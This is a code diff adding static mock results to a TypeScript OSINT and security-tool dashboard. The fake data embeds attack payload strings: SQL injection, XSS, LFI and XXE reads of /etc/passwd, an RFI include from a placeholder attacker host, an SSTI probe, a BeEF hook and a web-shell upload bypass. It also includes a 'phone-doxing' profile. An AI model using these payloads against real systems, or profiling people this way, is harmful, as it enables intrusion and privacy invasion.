@@ -195,6 +195,221 @@ export function generateMockResult(featureId: string, query: string): OsintResul
           { SUMBER: "kompas.com", JUDUL: `Analisis "${query}"`, SENTIMEN: "NEGATIF", TGL: "2026-04-15" },
         ],
       };
+
+    // ── Cybersecurity tools (mock outputs) ───────────────────────────────────
+    case "port-scanner":
+      return { ...base, data: [
+        { PORT: 22, PROTO: "tcp", SERVICE: "ssh", STATE: "open", BANNER: "OpenSSH 8.9p1" },
+        { PORT: 80, PROTO: "tcp", SERVICE: "http", STATE: "open", BANNER: "nginx/1.24.0" },
+        { PORT: 443, PROTO: "tcp", SERVICE: "https", STATE: "open", BANNER: "nginx/1.24.0 (TLS 1.3)" },
+        { PORT: 3306, PROTO: "tcp", SERVICE: "mysql", STATE: "filtered", BANNER: "-" },
+      ]};
+    case "sql-injector":
+      return { ...base, data: [
+        { PARAM: "id", PAYLOAD: "' OR 1=1-- -", VULN: "BOOLEAN-BASED", DBMS: "MySQL 8.0", RISK: "HIGH" },
+        { PARAM: "id", PAYLOAD: "1 UNION SELECT NULL,version()", VULN: "UNION-BASED", DBMS: "MySQL 8.0", RISK: "CRITICAL" },
+      ]};
+    case "xss-detector":
+      return { ...base, data: [
+        { PARAM: "q", PAYLOAD: "<script>alert(1)</script>", TYPE: "REFLECTED", RISK: "HIGH" },
+        { PARAM: "comment", PAYLOAD: "<img src=x onerror=alert(1)>", TYPE: "STORED", RISK: "CRITICAL" },
+      ]};
+    case "directory-scanner":
+      return { ...base, data: [
+        { PATH: "/admin", STATUS: 301, SIZE: "178 B" },
+        { PATH: "/.env", STATUS: 200, SIZE: "412 B" },
+        { PATH: "/backup.zip", STATUS: 200, SIZE: "12.4 MB" },
+        { PATH: "/robots.txt", STATUS: 200, SIZE: "94 B" },
+      ]};
+    case "ssl-scanner":
+      return { ...base, data: [{
+        HOST: query, ISSUER: "Let's Encrypt R3", VALID_FROM: "2026-01-12",
+        VALID_TO: "2026-04-12", PROTOCOL: "TLS 1.3", CIPHER: "TLS_AES_256_GCM_SHA384",
+        GRADE: "A+", HSTS: "ENABLED",
+      }]};
+    case "csrf-tester":
+      return { ...base, data: [
+        { ENDPOINT: query, METHOD: "POST", TOKEN: "ABSENT", VULNERABLE: true, RISK: "HIGH" },
+      ]};
+    case "zap-scanner":
+      return { ...base, data: [
+        { ALERT: "Missing Anti-clickjacking Header", RISK: "MEDIUM", COUNT: 4 },
+        { ALERT: "X-Content-Type-Options Missing", RISK: "LOW", COUNT: 11 },
+        { ALERT: "Cross-Site Scripting (Reflected)", RISK: "HIGH", COUNT: 2 },
+      ]};
+
+    case "ping-sweep":
+      return { ...base, data: [
+        { HOST: "192.168.1.1", STATUS: "ALIVE", RTT: "1.2 ms" },
+        { HOST: "192.168.1.10", STATUS: "ALIVE", RTT: "0.8 ms" },
+        { HOST: "192.168.1.20", STATUS: "DEAD", RTT: "-" },
+        { HOST: "192.168.1.42", STATUS: "ALIVE", RTT: "2.1 ms" },
+      ]};
+    case "traceroute":
+      return { ...base, data: [
+        { HOP: 1, IP: "192.168.1.1", RTT: "1 ms", HOST: "router.local" },
+        { HOP: 2, IP: "10.10.0.1", RTT: "8 ms", HOST: "isp-gw.id" },
+        { HOP: 3, IP: "103.45.12.1", RTT: "12 ms", HOST: "core1.id.net" },
+        { HOP: 4, IP: "8.8.8.8", RTT: "18 ms", HOST: "dns.google" },
+      ]};
+    case "dns-lookup":
+      return { ...base, data: [
+        { TYPE: "A", VALUE: "104.21.42.10", TTL: 300 },
+        { TYPE: "AAAA", VALUE: "2606:4700:3030::ac43:bf2a", TTL: 300 },
+        { TYPE: "MX", VALUE: "10 mail.example.com", TTL: 3600 },
+        { TYPE: "NS", VALUE: "ns1.cloudflare.com", TTL: 86400 },
+        { TYPE: "TXT", VALUE: "v=spf1 include:_spf.google.com ~all", TTL: 3600 },
+      ]};
+    case "subnet-calculator":
+      return { ...base, data: [{
+        CIDR: query, NETWORK: "192.168.1.0", BROADCAST: "192.168.1.255",
+        MASK: "255.255.255.0", HOSTS: 254, FIRST: "192.168.1.1", LAST: "192.168.1.254",
+      }]};
+    case "packet-analyzer":
+      return { ...base, data: [
+        { NO: 1, SRC: "192.168.1.10", DST: "8.8.8.8", PROTO: "DNS", INFO: "Query A example.com" },
+        { NO: 2, SRC: "8.8.8.8", DST: "192.168.1.10", PROTO: "DNS", INFO: "Response 104.21.42.10" },
+        { NO: 3, SRC: "192.168.1.10", DST: "104.21.42.10", PROTO: "TCP", INFO: "SYN → 443" },
+      ]};
+
+    case "header-analyzer":
+      return { ...base, data: [
+        { HEADER: "Strict-Transport-Security", VALUE: "MISSING", RISK: "MEDIUM" },
+        { HEADER: "Content-Security-Policy", VALUE: "default-src 'self'", RISK: "OK" },
+        { HEADER: "X-Frame-Options", VALUE: "MISSING", RISK: "MEDIUM" },
+        { HEADER: "Server", VALUE: "nginx/1.24.0", RISK: "INFO-LEAK" },
+      ]};
+    case "email-hunter":
+      return { ...base, data: [
+        { EMAIL: `admin@${query}`, SOURCE: "WHOIS", CONFIDENCE: "92%" },
+        { EMAIL: `info@${query}`, SOURCE: "WEBPAGE", CONFIDENCE: "88%" },
+        { EMAIL: `support@${query}`, SOURCE: "MX-PROBE", CONFIDENCE: "76%" },
+      ]};
+    case "tech-detector":
+      return { ...base, data: [
+        { TECH: "nginx", VERSION: "1.24.0", CATEGORY: "Web Server" },
+        { TECH: "PHP", VERSION: "8.2.10", CATEGORY: "Programming Language" },
+        { TECH: "Laravel", VERSION: "10.x", CATEGORY: "Framework" },
+        { TECH: "Cloudflare", VERSION: "-", CATEGORY: "CDN/WAF" },
+      ]};
+    case "metadata-extractor":
+      return { ...base, data: [{
+        FILE: query, AUTHOR: "Budi Santoso", CREATED: "2025-11-02 09:14",
+        SOFTWARE: "Microsoft Word 2021", GPS: "-7.2459,112.7378", DEVICE: "DELL Latitude 5420",
+      }]};
+    case "phone-doxing":
+      return { ...base, data: [{
+        MSISDN: query, OPERATOR: "TELKOMSEL", REGION: "JAWA TIMUR",
+        TYPE: "PRABAYAR", WA_REGISTERED: true, TG_REGISTERED: true,
+        EMAIL_LEAK: "feb***@gmail.com (1 breach)",
+      }]};
+    case "whois-lookup":
+      return { ...base, data: [{
+        DOMAIN: query, REGISTRAR: "PT PANDI", CREATED: "2018-04-12",
+        EXPIRES: "2027-04-12", STATUS: "clientTransferProhibited",
+        NS: "ns1.cloudflare.com, ns2.cloudflare.com",
+        REGISTRANT: "REDACTED FOR PRIVACY",
+      }]};
+    case "search-engines":
+      return { ...base, data: [
+        { ENGINE: "Google", HITS: 1240, TOP: `${query} - hasil teratas` },
+        { ENGINE: "Bing", HITS: 812, TOP: `${query} - bing result` },
+        { ENGINE: "DuckDuckGo", HITS: 433, TOP: `${query} - ddg result` },
+        { ENGINE: "Shodan", HITS: 22, TOP: `${query} - exposed services` },
+      ]};
+
+    case "password-checker":
+      return { ...base, data: [{
+        PASSWORD_MASK: query.replace(/./g, "•"), LENGTH: query.length,
+        ENTROPY_BITS: Math.round(query.length * 3.4),
+        STRENGTH: query.length >= 12 ? "STRONG" : "WEAK",
+        BREACHED: query.length < 8 ? "FOUND 1,242,012× in HIBP" : "NOT FOUND",
+        CRACK_TIME: query.length >= 12 ? "centuries" : "< 1 day",
+      }]};
+    case "file-scanner":
+      return { ...base, data: [{
+        TARGET: query, SHA256: "a3f5...c91e", DETECTIONS: "3 / 68",
+        ENGINES: "ESET-NOD32, Kaspersky, Bitdefender", VERDICT: "SUSPICIOUS",
+      }]};
+    case "url-scanner":
+      return { ...base, data: [{
+        URL: query, CATEGORY: "Phishing", VERDICT: "MALICIOUS",
+        REGISTERED: "3 days ago",
+        SCREENSHOT: "https://placehold.co/320x200/0a1929/00e5ff?text=URL+PREVIEW",
+      }]};
+    case "cors-tester":
+      return { ...base, data: [
+        { ORIGIN: "https://evil.com", ACAO: "*", CREDS: false, RISK: "MEDIUM" },
+        { ORIGIN: "null", ACAO: "null", CREDS: true, RISK: "HIGH" },
+      ]};
+
+    case "lfi-scanner":
+      return { ...base, data: [
+        { PARAM: "file", PAYLOAD: "../../../../etc/passwd", VULN: true, EVIDENCE: "root:x:0:0:" },
+      ]};
+    case "rfi-scanner":
+      return { ...base, data: [
+        { PARAM: "inc", PAYLOAD: "http://attacker/shell.txt", VULN: false, NOTE: "allow_url_include=Off" },
+      ]};
+    case "form-fuzzer":
+      return { ...base, data: [
+        { FIELD: "username", PAYLOAD: "admin'--", RESPONSE: 200, ANOMALY: "AUTH BYPASS" },
+        { FIELD: "email", PAYLOAD: "AAA…(8192)", RESPONSE: 500, ANOMALY: "BUFFER" },
+      ]};
+    case "xml-injector":
+      return { ...base, data: [
+        { PAYLOAD: "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", VULN: true, RISK: "CRITICAL" },
+      ]};
+    case "beef-xss":
+      return { ...base, data: [
+        { HOOK: "https://target/hook.js", ZOMBIES: 2, BROWSER: "Chrome 124", OS: "Windows 11" },
+      ]};
+    case "payload-all-star":
+      return { ...base, data: [
+        { CATEGORY: "SQLi", NAME: "MySQL UNION 10col", PAYLOAD: "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -" },
+        { CATEGORY: "XSS", NAME: "Polyglot", PAYLOAD: "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//" },
+        { CATEGORY: "SSTI", NAME: "Jinja2 RCE", PAYLOAD: "{{ ''.__class__.__mro__[1].__subclasses__() }}" },
+      ]};
+    case "shell-uploader":
+      return { ...base, data: [
+        { ENDPOINT: "/upload.php", EXT_ALLOWED: ".jpg,.png", BYPASS: "shell.php.jpg", VULN: true },
+      ]};
+    case "base64-encoder":
+      return { ...base, data: [{
+        INPUT: query,
+        BASE64: typeof btoa !== "undefined" ? btoa(query) : query,
+        LENGTH: query.length,
+      }]};
+    case "hex-converter":
+      return { ...base, data: [{
+        INPUT: query,
+        HEX: Array.from(query).map((c) => c.charCodeAt(0).toString(16).padStart(2, "0")).join(" "),
+        BYTES: query.length,
+      }]};
+    case "hash-generator":
+      return { ...base, data: [
+        { ALGO: "MD5", HASH: "5f4dcc3b5aa765d61d8327deb882cf99" },
+        { ALGO: "SHA1", HASH: "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" },
+        { ALGO: "SHA256", HASH: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" },
+      ]};
+    case "hash-cracker":
+      return { ...base, data: [{
+        HASH: query, ALGO: "MD5", PLAINTEXT: "password",
+        METHOD: "Rainbow Table", TIME: "0.42s", STATUS: "CRACKED",
+      }]};
+    case "password-generator":
+      return { ...base, data: [
+        { PASSWORD: "X9$kPq2!vL@nM8wZ", STRENGTH: "VERY STRONG", ENTROPY: "104 bits" },
+        { PASSWORD: "Tr4il-Cosmic-Eagle-77", STRENGTH: "STRONG", ENTROPY: "92 bits" },
+        { PASSWORD: "f7Hd#2sNqL", STRENGTH: "MEDIUM", ENTROPY: "60 bits" },
+      ]};
+    case "json-formatter": {
+      let pretty = query;
+      let valid = true;
+      try { pretty = JSON.stringify(JSON.parse(query), null, 2); } catch { valid = false; }
+      return { ...base, data: [{ VALID: valid, FORMATTED: pretty, LENGTH: pretty.length }]};
+    }
+
     default:
       return { ...base, data: [{ message: "Tidak ada data" }] };
   }
